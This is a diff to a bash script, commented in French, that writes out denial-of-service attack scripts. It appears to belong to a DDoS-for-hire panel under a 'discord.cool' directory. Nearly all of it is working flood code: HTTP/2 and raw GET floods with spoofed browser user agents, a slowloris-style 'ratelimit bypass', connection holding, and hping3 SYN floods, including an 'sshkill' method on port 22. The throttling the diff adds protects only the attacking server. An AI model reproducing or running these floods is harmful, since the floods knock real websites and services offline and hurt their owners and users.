@@ -107,8 +107,15 @@ get_attack_params() {
     read -p "$(echo -e ${YELLOW}Duration in seconds [default: 60]:${NC} ) " DURATION
     DURATION=${DURATION:-60}
     
-    read -p "$(echo -e ${YELLOW}Threads/Connections [default: 1000]:${NC} ) " THREADS
-    THREADS=${THREADS:-1000}
+    read -p "$(echo -e ${YELLOW}Threads/Connections [default: 500, max recommended: 2000]:${NC} ) " THREADS
+    THREADS=${THREADS:-500}
+    
+    # Limiter le nombre de threads pour éviter la surcharge
+    MAX_THREADS=2000
+    if [ "$THREADS" -gt "$MAX_THREADS" ]; then
+        echo -e "${YELLOW}⚠ Limiting threads to $MAX_THREADS to prevent server overload${NC}"
+        THREADS=$MAX_THREADS
+    fi
     
     # Vérifier restriction L4 sur ports 80/443
     if [[ "$method" =~ ^(tcp|tcp-bot|tcp-pshack|tcprand|sshkill|sshkill-bot)$ ]]; then
@@ -154,7 +161,15 @@ create_l7_script() {
     esac
 }
 
-# Script HTTP/2 Browser Emulation (performant)
+# Fonction pour vérifier les ressources système
+check_resources() {
+    local cpu_usage=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1}')
+    local mem_usage=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
+    
+    echo "$cpu_usage $mem_usage"
+}
+
+# Script HTTP/2 Browser Emulation (performant avec protection ressources)
 create_h2_browser_script() {
     local method=$1
     cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
@@ -162,7 +177,7 @@ create_h2_browser_script() {
 TARGET=$1
 PORT=${2:-443}
 DURATION=${3:-60}
-THREADS=${4:-1000}
+THREADS=${4:-500}
 OPTIONS=$5
 
 METHOD="METHOD_NAME"
@@ -170,9 +185,17 @@ TIMEOUT=$((DURATION + 10))
 PROTOCOL="https"
 [ "$PORT" = "80" ] && PROTOCOL="http"
 
-echo "[$METHOD] Starting attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"
+# Limites de sécurité
+MAX_CONCURRENT=100
+MAX_CPU=85
+MAX_MEM=85
+BATCH_SIZE=20
+BATCH_DELAY=0.1
 
-# User agents rotatifs pour simuler de vrais navigateurs
+echo "[$METHOD] Starting attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"
+echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"
+
+# User agents rotatifs
 UA_LIST=(
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
@@ -180,7 +203,7 @@ UA_LIST=(
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 )
 
-# Fonction d'attaque HTTP/2 avec curl
+# Fonction d'attaque avec contrôle ressources
 attack_h2() {
     local tid=$1
     local end_time=$(($(date +%s) + DURATION))
@@ -188,6 +211,25 @@ attack_h2() {
     local ua="${UA_LIST[$ua_idx]}"
     
     while [ $(date +%s) -lt $end_time ]; do
+        # Vérifier les ressources toutes les 10 requêtes
+        if [ $((tid % 10)) -eq 0 ]; then
+            local resources=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{cpu=100-$1; mem=$(free | grep Mem | awk "{printf \"%.0f\", \$3/\$2 * 100.0}"); print cpu" "mem}')
+            local cpu=$(echo $resources | awk '{print $1}')
+            local mem=$(echo $resources | awk '{print $2}')
+            
+            if (( $(echo "$cpu > $MAX_CPU" | bc -l) )) || (( $(echo "$mem > $MAX_MEM" | bc -l) )); then
+                sleep 0.5
+                continue
+            fi
+        fi
+        
+        # Limiter les processus simultanés
+        local running=$(jobs -r | wc -l)
+        while [ $running -ge $MAX_CONCURRENT ]; do
+            sleep 0.1
+            running=$(jobs -r | wc -l)
+        done
+        
         curl -s -k -m 1 \
             --http2 \
             --http2-prior-knowledge \
@@ -203,17 +245,18 @@ attack_h2() {
             -H "Cache-Control: max-age=0" \
             "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
         
-        # Limiter le nombre de processus simultanés
-        if [ $(jobs -r | wc -l) -gt 50 ]; then
-            wait
-        fi
+        sleep 0.05
     done
 }
 
-# Lancer les threads
+# Lancer les threads par batch pour éviter la surcharge
 for i in $(seq 1 $THREADS); do
     attack_h2 $i &
-    sleep 0.01
+    
+    # Lancer par batch avec pause
+    if [ $((i % BATCH_SIZE)) -eq 0 ]; then
+        sleep $BATCH_DELAY
+    fi
 done
 
 wait
@@ -224,7 +267,7 @@ SCRIPT_EOF
     chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
 }
 
-# Script HTTP/2 Raw (haute performance)
+# Script HTTP/2 Raw (haute performance avec protection)
 create_h2_raw_script() {
     local method=$1
     cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
@@ -232,40 +275,66 @@ create_h2_raw_script() {
 TARGET=$1
 PORT=${2:-443}
 DURATION=${3:-60}
-THREADS=${4:-1000}
+THREADS=${4:-500}
 OPTIONS=$5
 
 METHOD="METHOD_NAME"
-TIMEOUT=$((DURATION + 10))
 PROTOCOL="https"
 [ "$PORT" = "80" ] && PROTOCOL="http"
 
-echo "[$METHOD] Starting high RPS attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"
+# Limites de sécurité
+MAX_CONCURRENT=150
+MAX_CPU=85
+MAX_MEM=85
+BATCH_SIZE=25
+BATCH_DELAY=0.05
 
-# Attaque HTTP/2 brute force avec curl
+echo "[$METHOD] Starting high RPS attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"
+echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"
+
+# Attaque HTTP/2 avec contrôle ressources
 attack_raw() {
     local tid=$1
     local end_time=$(($(date +%s) + DURATION))
+    local request_count=0
     
     while [ $(date +%s) -lt $end_time ]; do
-        for i in {1..10}; do
-            curl -s -k -m 0.5 \
-                --http2 \
-                --http2-prior-knowledge \
-                --no-keepalive \
-                "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
+        # Vérifier les ressources périodiquement
+        if [ $((request_count % 20)) -eq 0 ]; then
+            local cpu=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100-$1}')
+            local mem=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
+            
+            if (( $(echo "$cpu > $MAX_CPU" | bc -l) )) || (( $(echo "$mem > $MAX_MEM" | bc -l) )); then
+                sleep 0.3
+                continue
+            fi
+        fi
+        
+        # Limiter les processus simultanés
+        local running=$(jobs -r | wc -l)
+        while [ $running -ge $MAX_CONCURRENT ]; do
+            sleep 0.05
+            running=$(jobs -r | wc -l)
         done
         
-        # Contrôle du nombre de processus
-        if [ $(jobs -r | wc -l) -gt 100 ]; then
-            wait -n
-        fi
+        curl -s -k -m 0.5 \
+            --http2 \
+            --http2-prior-knowledge \
+            --no-keepalive \
+            "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
+        
+        request_count=$((request_count + 1))
+        sleep 0.02
     done
 }
 
+# Lancer par batch
 for i in $(seq 1 $THREADS); do
     attack_raw $i &
-    sleep 0.005
+    
+    if [ $((i % BATCH_SIZE)) -eq 0 ]; then
+        sleep $BATCH_DELAY
+    fi
 done
 
 wait
@@ -276,7 +345,7 @@ SCRIPT_EOF
     chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
 }
 
-# Script HTTP Raw GET
+# Script HTTP Raw GET (avec protection)
 create_http_raw_script() {
     local method=$1
     cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
@@ -284,33 +353,64 @@ create_http_raw_script() {
 TARGET=$1
 PORT=${2:-80}
 DURATION=${3:-60}
-THREADS=${4:-1000}
+THREADS=${4:-500}
 OPTIONS=$5
 
 METHOD="METHOD_NAME"
 PROTOCOL="http"
 [ "$PORT" = "443" ] && PROTOCOL="https"
 
-echo "[$METHOD] Starting RAW GET flood on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"
+# Limites de sécurité
+MAX_CONCURRENT=200
+MAX_CPU=85
+MAX_MEM=85
+BATCH_SIZE=30
+BATCH_DELAY=0.08
 
-# Attaque GET brute
+echo "[$METHOD] Starting RAW GET flood on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"
+echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"
+
+# Attaque GET avec contrôle
 attack_get() {
+    local tid=$1
     local end_time=$(($(date +%s) + DURATION))
+    local request_count=0
     
     while [ $(date +%s) -lt $end_time ]; do
+        # Vérifier ressources
+        if [ $((request_count % 15)) -eq 0 ]; then
+            local cpu=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100-$1}')
+            local mem=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
+            
+            if (( $(echo "$cpu > $MAX_CPU" | bc -l) )) || (( $(echo "$mem > $MAX_MEM" | bc -l) )); then
+                sleep 0.2
+                continue
+            fi
+        fi
+        
+        # Limiter processus
+        local running=$(jobs -r | wc -l)
+        while [ $running -ge $MAX_CONCURRENT ]; do
+            sleep 0.05
+            running=$(jobs -r | wc -l)
+        done
+        
         curl -s -k -m 1 \
             --no-keepalive \
             "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
         
-        if [ $(jobs -r | wc -l) -gt 200 ]; then
-            wait -n
-        fi
+        request_count=$((request_count + 1))
+        sleep 0.03
     done
 }
 
+# Lancer par batch
 for i in $(seq 1 $THREADS); do
-    attack_get &
-    sleep 0.01
+    attack_get $i &
+    
+    if [ $((i % BATCH_SIZE)) -eq 0 ]; then
+        sleep $BATCH_DELAY
+    fi
 done
 
 wait
@@ -321,7 +421,7 @@ SCRIPT_EOF
     chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
 }
 
-# Script Zero (bypass ratelimit)
+# Script Zero (bypass ratelimit avec protection)
 create_zero_script() {
     local method=$1
     cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
@@ -329,34 +429,72 @@ create_zero_script() {
 TARGET=$1
 PORT=${2:-443}
 DURATION=${3:-60}
-THREADS=${4:-1000}
+THREADS=${4:-500}
 OPTIONS=$5
 
 METHOD="METHOD_NAME"
 PROTOCOL="https"
 [ "$PORT" = "80" ] && PROTOCOL="http"
 
-echo "[$METHOD] Starting ratelimit bypass attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s"
+# Limites pour slowloris-like
+MAX_CONCURRENT=80
+MAX_CPU=80
+MAX_MEM=80
+BATCH_SIZE=15
+BATCH_DELAY=0.15
 
-# Slowloris-like avec HTTP/2
+echo "[$METHOD] Starting ratelimit bypass attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s"
+echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"
+
+# Slowloris-like avec HTTP/2 et protection
 if command -v slowloris &> /dev/null; then
-    slowloris "$TARGET" -p "$PORT" -s "$THREADS" -t "$DURATION" $OPTIONS
+    # Limiter les threads pour slowloris
+    SLOWLORIS_THREADS=$((THREADS > 500 ? 500 : THREADS))
+    slowloris "$TARGET" -p "$PORT" -s "$SLOWLORIS_THREADS" -t "$DURATION" $OPTIONS
 else
-    # Implémentation manuelle
+    # Implémentation manuelle avec contrôle
     attack_zero() {
+        local tid=$1
         local end_time=$(($(date +%s) + DURATION))
+        local conn_count=0
+        
         while [ $(date +%s) -lt $end_time ]; do
+            # Vérifier ressources
+            if [ $((conn_count % 10)) -eq 0 ]; then
+                local cpu=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100-$1}')
+                local mem=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
+                
+                if (( $(echo "$cpu > $MAX_CPU" | bc -l) )) || (( $(echo "$mem > $MAX_MEM" | bc -l) )); then
+                    sleep 0.5
+                    continue
+                fi
+            fi
+            
+            # Limiter connexions simultanées
+            local running=$(jobs -r | wc -l)
+            while [ $running -ge $MAX_CONCURRENT ]; do
+                sleep 0.2
+                running=$(jobs -r | wc -l)
+            done
+            
             curl -s -k -m 10 \
                 --http2 \
                 --max-time 10 \
                 --keepalive-time 10 \
                 "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
+            
+            conn_count=$((conn_count + 1))
             sleep 0.1
         done
     }
     
+    # Lancer par batch
     for i in $(seq 1 $THREADS); do
-        attack_zero &
+        attack_zero $i &
+        
+        if [ $((i % BATCH_SIZE)) -eq 0 ]; then
+            sleep $BATCH_DELAY
+        fi
     done
     wait
 fi
@@ -368,7 +506,7 @@ SCRIPT_EOF
     chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
 }
 
-# Script VHold (holding connections)
+# Script VHold (holding connections avec protection)
 create_vhold_script() {
     local method=$1
     cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
@@ -387,23 +525,43 @@ PROTOCOL="https"
 THREADS=$((THREADS > 10 ? 10 : THREADS))
 DURATION=$((DURATION > 7200 ? 7200 : DURATION))
 
-echo "[$METHOD] Holding connections on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS connections"
+# Limites de sécurité
+MAX_CPU=75
+MAX_MEM=75
 
-# Maintenir les connexions ouvertes
+echo "[$METHOD] Holding connections on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS connections"
+echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%"
+
+# Maintenir les connexions ouvertes avec monitoring
 hold_connection() {
+    local conn_id=$1
     local end_time=$(($(date +%s) + DURATION))
+    local reconnect_interval=5
+    
     while [ $(date +%s) -lt $end_time ]; do
-        curl -s -k -m "$DURATION" \
+        # Vérifier ressources avant de reconnecter
+        local cpu=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100-$1}')
+        local mem=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
+        
+        if (( $(echo "$cpu > $MAX_CPU" | bc -l) )) || (( $(echo "$mem > $MAX_MEM" | bc -l) )); then
+            sleep 2
+            continue
+        fi
+        
+        curl -s -k -m 30 \
             --http2 \
-            --max-time "$DURATION" \
+            --max-time 30 \
             --no-buffer \
             "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 || true
-        sleep 1
+        
+        sleep $reconnect_interval
     done
 }
 
+# Lancer avec délai entre chaque connexion
 for i in $(seq 1 $THREADS); do
-    hold_connection &
+    hold_connection $i &
+    sleep 0.5
 done
 
 wait
@@ -414,7 +572,7 @@ SCRIPT_EOF
     chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
 }
 
-# Script générique L7
+# Script générique L7 (avec protection)
 create_generic_l7_script() {
     local method=$1
     cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
@@ -422,31 +580,63 @@ create_generic_l7_script() {
 TARGET=$1
 PORT=${2:-443}
 DURATION=${3:-60}
-THREADS=${4:-1000}
+THREADS=${4:-500}
 OPTIONS=$5
 
 METHOD="METHOD_NAME"
 PROTOCOL="https"
 [ "$PORT" = "80" ] && PROTOCOL="http"
 
+# Limites de sécurité
+MAX_CONCURRENT=120
+MAX_CPU=85
+MAX_MEM=85
+BATCH_SIZE=20
+BATCH_DELAY=0.1
+
 echo "[$METHOD] Starting attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"
+echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"
 
 attack_generic() {
+    local tid=$1
     local end_time=$(($(date +%s) + DURATION))
+    local request_count=0
+    
     while [ $(date +%s) -lt $end_time ]; do
+        # Vérifier ressources
+        if [ $((request_count % 12)) -eq 0 ]; then
+            local cpu=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100-$1}')
+            local mem=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
+            
+            if (( $(echo "$cpu > $MAX_CPU" | bc -l) )) || (( $(echo "$mem > $MAX_MEM" | bc -l) )); then
+                sleep 0.3
+                continue
+            fi
+        fi
+        
+        # Limiter processus
+        local running=$(jobs -r | wc -l)
+        while [ $running -ge $MAX_CONCURRENT ]; do
+            sleep 0.08
+            running=$(jobs -r | wc -l)
+        done
+        
         curl -s -k -m 1 \
             --http2 \
             "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
         
-        if [ $(jobs -r | wc -l) -gt 100 ]; then
-            wait -n
-        fi
+        request_count=$((request_count + 1))
+        sleep 0.04
     done
 }
 
+# Lancer par batch
 for i in $(seq 1 $THREADS); do
-    attack_generic &
-    sleep 0.01
+    attack_generic $i &
+    
+    if [ $((i % BATCH_SIZE)) -eq 0 ]; then
+        sleep $BATCH_DELAY
+    fi
 done
 
 wait
@@ -457,7 +647,7 @@ SCRIPT_EOF
     chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
 }
 
-# Fonction pour créer un script L4 performant
+# Fonction pour créer un script L4 performant avec protection
 create_l4_script() {
     local method=$1
     mkdir -p /opt/discord.cool/attacks
@@ -467,7 +657,7 @@ create_l4_script() {
 TARGET=$1
 PORT=${2:-8080}
 DURATION=${3:-60}
-THREADS=${4:-1000}
+THREADS=${4:-500}
 OPTIONS=$5
 
 METHOD="METHOD_NAME"
@@ -478,35 +668,77 @@ if [ "$PORT" = "80" ] || [ "$PORT" = "443" ]; then
     exit 1
 fi
 
+# Limites de sécurité pour L4
+MAX_CONCURRENT=300
+MAX_CPU=80
+MAX_MEM=80
+BATCH_SIZE=50
+BATCH_DELAY=0.2
+
 echo "[$METHOD] Starting attack on $TARGET:$PORT for ${DURATION}s with $THREADS threads"
+echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"
 
 if command -v hping3 &> /dev/null; then
+    # Fonction pour lancer hping3 avec contrôle
+    launch_hping() {
+        local hping_cmd="$1"
+        local process_count=0
+        
+        for i in $(seq 1 $THREADS); do
+            # Vérifier ressources périodiquement
+            if [ $((process_count % 50)) -eq 0 ]; then
+                local cpu=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100-$1}')
+                local mem=$(free | grep Mem | awk '{printf "%.0f", $3/$2 * 100.0}')
+                
+                if (( $(echo "$cpu > $MAX_CPU" | bc -l) )) || (( $(echo "$mem > $MAX_MEM" | bc -l) )); then
+                    sleep 0.5
+                    continue
+                fi
+            fi
+            
+            # Limiter processus simultanés
+            local running=$(jobs -r | wc -l)
+            while [ $running -ge $MAX_CONCURRENT ]; do
+                sleep 0.1
+                running=$(jobs -r | wc -l)
+            done
+            
+            eval "$hping_cmd" &
+            process_count=$((process_count + 1))
+            
+            # Lancer par batch
+            if [ $((process_count % BATCH_SIZE)) -eq 0 ]; then
+                sleep $BATCH_DELAY
+            fi
+        done
+    }
+    
     case "$METHOD" in
         tcp|tcp-bot)
-            for i in $(seq 1 $THREADS); do
-                timeout "$DURATION" hping3 -S -p "$PORT" -i u1000 "$TARGET" &
-            done
+            launch_hping "timeout $DURATION hping3 -S -p $PORT -i u1000 $TARGET"
             ;;
         tcp-pshack)
-            for i in $(seq 1 $THREADS); do
-                timeout "$DURATION" hping3 -S -A -P -F -p "$PORT" -i u1000 "$TARGET" &
-            done
+            launch_hping "timeout $DURATION hping3 -S -A -P -F -p $PORT -i u1000 $TARGET"
             ;;
         tcprand)
             for i in $(seq 1 $THREADS); do
                 RAND_PORT=$((RANDOM % 65535 + 1))
+                local running=$(jobs -r | wc -l)
+                while [ $running -ge $MAX_CONCURRENT ]; do
+                    sleep 0.1
+                    running=$(jobs -r | wc -l)
+                done
                 timeout "$DURATION" hping3 -S -p "$RAND_PORT" -i u1000 "$TARGET" &
+                if [ $((i % BATCH_SIZE)) -eq 0 ]; then
+                    sleep $BATCH_DELAY
+                fi
             done
             ;;
         sshkill|sshkill-bot)
-            for i in $(seq 1 $THREADS); do
-                timeout "$DURATION" hping3 -S -p 22 -i u500 "$TARGET" &
-            done
+            launch_hping "timeout $DURATION hping3 -S -p 22 -i u500 $TARGET"
             ;;
         *)
-            for i in $(seq 1 $THREADS); do
-                timeout "$DURATION" hping3 -S -p "$PORT" -i u1000 "$TARGET" &
-            done
+            launch_hping "timeout $DURATION hping3 -S -p $PORT -i u1000 $TARGET"
             ;;
     esac
     wait
